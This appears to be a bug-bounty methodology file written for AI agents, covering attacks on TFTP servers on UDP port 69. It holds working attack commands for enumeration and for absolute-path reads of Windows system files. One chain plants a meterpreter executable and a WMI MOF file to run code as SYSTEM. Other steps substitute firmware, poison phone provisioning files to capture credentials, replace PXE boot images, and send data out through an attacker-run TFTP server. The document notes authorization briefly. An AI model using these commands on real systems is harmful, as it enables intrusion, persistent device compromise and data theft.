---
technology: "TFTP"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "evidence-grounded on 1 full chain + 1 detection sighting (command-context gate 2026-11-12): full chain — 69/udp open 'SolarWinds Free tftpd', nc -u verification, tftp client 'get /windows/system32/eula.txt' (absolute-path read), 'binary' mode, 'put update.exe /windows/system32/update.exe' and 'put telemetry.mof /windows/system32/wbem/mof/telemetry.mof' (msfvenom meterpreter EXE + WBEM MOF -> WMI auto-compile -> SYSTEM); sighting — '69/udp open|filtered tftp' in nmap only (real chain via SNMP). Upstream: RFC 1350 (RRQ/WRQ/DATA/ACK/ERROR formats, 512-byte blocks, error codes 0-7, no auth/no listing); nmap tftp-enum NSE docs (built-in 255-entry list + generated A.B.C.X-confg; filelist arg; reimplementation of tftptheft) and nmap's nselib/data/tftplist.txt contents; tftpd-hpa tftpd(8) (--create existing-files-only default, world-rw created files, --ro, --max-upload/RFC 2349 tsize, -s chroot); metasploit auxiliary/scanner/tftp/tftpbrute.rb existence. Thin unit, first-class per standing rule. Companion overview: [[tftp|TFTP]]. Phase 6 additions: rewritten from HackTricks (hacktricks/src/network-services-pentesting/69-udp-tftp.md), CC BY-NC 4.0, accessed 2026-11-13 — tftp_transfer_util verified in the metasploit repo, tftpy API verified against its source; the reference's Erlang/OTP TFTP traversal advisory (GHSA-hmrc-prh3-rpvp) verified ABSENT upstream and excluded as phantom."
---

# TFTP bug bounty methodology

Target model: a TFTP daemon on UDP/69 — network-device config store, VoIP/printer/ICS provisioning root, PXE boot
dir, or a stray Windows freeware tftpd. No authentication exists in the protocol; the daemon's root discipline and
write policy are the only boundaries. Reads are generally safe; WRQs change state and MOF/config writes weaponize
consumer systems — explicit authorization for every write.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| UDP/69 liveness | answers RRQ | yes | Service confirmed beyond open|filtered — Info |
| Dictionary enumeration (tftp-enum) | any read rights | yes | Configs/firmware/provisioning files — Medium/High |
| Absolute/traversal reads | no chroot (freeware daemons) | yes | Whole-filesystem read — Critical |
| WRQ write probing | daemon upload policy | yes | Error-2 = fenced; ACK 0 = write primitive — gate |
| Firmware/config substitution | write into a boot/pulled path | yes | Persistent device/system compromise — Critical |
| TFTP as exfil channel | attacker-side tftpd with uploads | n/a | Blended UDP exfil/pivot — High (impact) |

## Phase 0 — Detect (UDP reality check)

```bash
nmap -sU -p 69 -sV 198.51.100.40
# 69/udp open  tftp  SolarWinds Free tftpd      (or: tftpd-hpa / atftpd banners, or open|filtered)
```

UDP scans overstate certainty: `open|filtered` (the observed sighting state) means no answer — resolve it with a real
request. The observed verification is the template:

```bash
printf '\x00\x01eula.txt\x00octet\x00' | timeout 5 nc -u 198.51.100.40 69 | xxd | head
# opcode \x00\x01 = RRQ; any DATA (\x00\x03) back = live; ICMP port-unreachable or silence = filtered
```

Note the banner tells you the *class* of daemon: tftpd-hpa/atftpd on Linux (expect chroot + upload policy),
SolarWinds-class freeware on Windows (historically no chroot — Phase 2 escalation likely).

## Phase 1 — Dictionary enumeration

```bash
nmap -sU -p 69 --script tftp-enum 198.51.100.40
# | tftp-enum:
# |_  bootrom.ld
nmap -sU -p 69 --script tftp-enum --script-args tftp-enum.filelist=custom.txt 198.51.100.40
```

tftp-enum (discovery/intrusive) probes the built-in 255-entry list plus per-target Cisco config names
(`A.B.C.X-confg` for every X in 0..255 against target A.B.C.D). Build custom lists from the target's identity,
mirroring the built-in list's classes:

- **Network device configs**: `admin-confg`, `backup-config`, `boot-config`, `<hostname>-confg`, `cisco-confg`,
  `startup-config`, `running-config`, `<A.B.C.X>-confg` (per nmap's generated pattern).
- **VoIP provisioning**: `OS79XX.TXT`, `P003-08-x-00.bin`/`P0S3-*` loads, `SEP<MAC>.cnf.xml`, `{mac}.cfg`,
  `000000000000.cfg`, `000000000000-directory.xml`, `46xxsettings.txt`.
- **Firmware/boot**: `bootrom.ld`, `CFE.bin`, `TEImage.bin`/`TECfg.bin`, `*.bin` loads, `kickstart`/`image` names.
- **Traversal probe** (the built-in list ships one — `..\..\..\..\..\..\..\boot.ini`): on Windows daemons test
  `../../` forms and absolute paths (`/windows/system32/...`); on chrooted daemons expect error 1/2.

For deeper name-hunting, metasploit carries auxiliary/scanner/tftp/tftpbrute (same dictionary principle); a
sniffed legitimate RRQ from the wire (a phone booting, a router saving) is worth more than any wordlist.

## Phase 2 — Read primitive and its reach

```bash
tftp 198.51.100.40
tftp> binary                     # octet mode — always, for anything non-text
tftp> get eula.txt
tftp> get /windows/system32/eula.txt      # absolute path — worked verbatim on the observed SolarWinds box
Received 41543 bytes in 8.8 seconds
```

Findings discipline: file-not-found is ERROR 1, access violation is ERROR 2 — record which you get per path class;
ERROR 2 on `../` forms means a chroot boundary, ERROR 1 means the path resolved and missed. Everything recovered is
reportable data: device configs → enable/WiFi/SIP credentials; firmware → version identification; provisioning
files → internal hostnames and VLANs. `octet` mode for binaries, `netascii` only for text, or you corrupt files
silently.

## Phase 3 — Write probing (WRQ policy oracle)

```bash
tftp> put test.txt newname.txt     # WRQ for a NEW filename
# ERROR 2 "Access violation"  -> tftpd-hpa default: existing files only (or --ro)
# ACK 0                        -> --create (or freeware): the write primitive exists
tftp> put test.txt existing.cfg    # overwrite attempt — default tftpd-hpa allows overwrites of existing files
```

Read the daemon's flags when you can see process lines (`ps`/service config on a foothold): `-c/--create` creates
new files **world-read-writable** unless `--umask`/`--permissive` were set; `--ro` denies all WRQs;
`--max-upload N` enforces a size cap via the RFC 2349 tsize option; `-s DIR` is the chroot fence. Every WRQ you
send alters the target — probe with a single small file and clean up.

## Phase 4 — Weaponization (the observed chain, generalized)

With a write primitive, the payoff is the consumer of the directory:

1. **Windows + whole-filesystem write (observed chain, verbatim)**: `binary` mode; PUT a meterpreter EXE to
   `/windows/system32/update.exe`, then PUT a MOF to `/windows/system32/wbem/mof/telemetry.mof` — WMI's MOF
   auto-compiler executes it as SYSTEM. The 250 KB EXE crawled over lock-step 512-byte blocks (~2 KB/s in the
   observed evidence) — size payloads for patience.
2. **Firmware substitution**: overwrite a phone/printer/ICS firmware load the device pulls at boot
   (`OS79XX.TXT` pointing at images, `*.bin` staging) — persistent device-level code execution, no disk
   artifacts on any server.
3. **Config poisoning**: rewrite a provisioning file (`{mac}.cfg`, `46xxsettings.txt`) to point devices at your
   SIP/log/syslog host — credential capture from booting phones.
4. **PXE boot dirs**: replace a boot image or menu file — next deployment boots your code.

## Phase 5 — TFTP as exfil / pivot

Outbound blend: stand up your own tftpd with uploads enabled (tftpd-hpa `--create`, or atftpd `--daemon`) and WRQ
staged files to it from the target segment — UDP, tiny, and indistinguishable from provisioning on OT/print
networks. Pivot form: a readable device config (`A.B.C.X-confg`, SNMP-backed estate maps — see [[snmp]]) yields
the next layer of credentials; a read-write PXE root yields the next subnet. Report exposure either way: an
unauthenticated, unencrypted file service reachable beyond its management VLAN is a finding on its own.

## Phase 6 — Client tooling and protocol notes (upstream additions, 2026-11-13)

- **Metasploit transfer utility**: `auxiliary/admin/tftp/tftp_transfer_util` wraps the
  same GET/PUT against a target (set `RHOSTS`, `REMOTE_FILENAME`, action Download/Upload)
  — handy when you want the transfer logged in the msf session rather than a shell.
- **Scripted exact-name transfers**: the Python tftpy library drives RRQ/WRQ directly
  (`TftpClient("<host>", 69)` then `client.download("<remote>", "<local>")` /
  `client.upload(...)`), which beats interactive clients when walking a long candidate
  list of exact pathnames.
- **Error codes beyond the oracle pair**: the Phase 2/3 oracle rests on ERROR 1 vs 2, but
  two more RFC 1350 codes carry signal — ERROR 6 "file already exists" answers a WRQ for
  a name that is taken (confirms the name without reading it), and ERROR 5 "unknown
  transfer ID" typically means a firewall or NAT broke the negotiated flow mid-transfer.
- **Mid-transfer failure diagnosis**: when 69/udp answers but every transfer stalls,
  capture all UDP to the host (`tcpdump -ni any 'udp and host <target>'`) and check
  whether the negotiated server-source-port flow is being dropped — the classic
  allow-69-only firewall mistake.
- **There is no delete request**: TFTP cannot remove a file it wrote; whatever you PUT
  stays until someone cleans it up, so probe with one small canary and plan cleanup with
  the owner from the start.
- **Shodan**: `port:69` surfaces internet-exposed daemons (expect ISP/IoT provisioning
  boxes and forgotten print servers).

  *Excluded after verification:* the upstream reference carries a 2026 "Erlang/OTP TFTP
  path traversal" advisory citation (GHSA-hmrc-prh3-rpvp) that exists in neither the
  GitHub advisory database nor the erlang/otp repository advisory list — treated as a
  phantom citation and not imported. Path-traversal testing itself is Phase 1/2 work
  already covered above.

## Tool reference (prose)

nmap with the tftp-enum NSE for dictionary enumeration; netcat for raw opcode probes; the stock tftp client
(binary mode, get/put); metasploit's tftpbrute scanner and msfvenom for the payload side of the MOF chain; a
tftpd-hpa/atftpd instance on your host as the exfil listener.
